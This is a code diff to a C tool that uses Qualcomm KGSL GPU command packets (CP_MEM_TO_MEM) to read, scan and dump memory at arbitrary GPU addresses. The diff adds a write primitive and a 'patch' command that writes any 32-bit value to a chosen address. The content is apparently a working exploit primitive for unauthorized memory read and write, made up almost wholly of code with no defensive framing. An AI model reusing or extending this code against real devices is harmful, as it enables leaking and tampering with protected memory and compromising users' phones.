@@ -78,12 +78,12 @@ int init_kgsl() {
     return 0;
 }
 
-int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
+int gpu_mem_op(uint64_t src_gpu_va, uint64_t dst_gpu_va, int size) {
     uint32_t *cmd = (uint32_t *)ib_vma;
     int dw = 0;
 
     uint32_t d_lo, d_hi, s_lo, s_hi;
-    split64(dst_gpu, &d_lo, &d_hi);
+    split64(dst_gpu_va, &d_lo, &d_hi);
     split64(src_gpu_va, &s_lo, &s_hi);
 
     cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
@@ -107,9 +107,18 @@ int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
         if (rt.timestamp >= gpu_cmd.timestamp) break;
         usleep(100);
     }
+    return 0;
+}
 
+int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
+    if (gpu_mem_op(src_gpu_va, dst_gpu, PAGE_SIZE) != 0) return -1;
     memcpy(out_buf, dst_vma, PAGE_SIZE);
     return 0;
+}
+
+int write_gpu_mem(uint64_t dst_gpu_va, uint8_t *src_buf, int size) {
+    memcpy(dst_vma, src_buf, size);
+    return gpu_mem_op(dst_gpu, dst_gpu_va, size);
 }
 
 #include <sys/wait.h>
@@ -186,6 +195,15 @@ int main(int argc, char **argv) {
             } else {
                 printf("READ_FAILED\n");
             }
+        } else if (strncmp(line, "patch ", 6) == 0) {
+            uint64_t addr;
+            uint32_t val;
+            sscanf(line + 6, "%lx %x", &addr, &val);
+            if (write_gpu_mem(addr, (uint8_t *)&val, 4) == 0) {
+                printf("PATCH_SUCCESS\n");
+            } else {
+                printf("PATCH_FAILED\n");
+            }
         } else if (strncmp(line, "scan ", 5) == 0) {
             uint64_t start, end;
             sscanf(line + 5, "%lx %lx", &start, &end);
@@ -206,7 +224,6 @@ int main(int argc, char **argv) {
                         if (memmem(buf, PAGE_SIZE, "\x7f" "ELF", 4)) found_sig = 3;
                         
                         if (found_sig) {
-                            // Automatically dump data for matches to avoid deadlock
                             printf("MATCH:%lx:%d\n", (unsigned long)va, found_sig);
                             printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
                             fwrite(buf, 1, PAGE_SIZE, stdout);
@@ -214,7 +231,6 @@ int main(int argc, char **argv) {
                         }
                     }
                 }
-                // Faster scanning, but with a small sleep to avoid hanging the GPU
                 if ((va / PAGE_SIZE) % 100 == 0) usleep(10);
             }
             printf("SCAN_DONE\n");
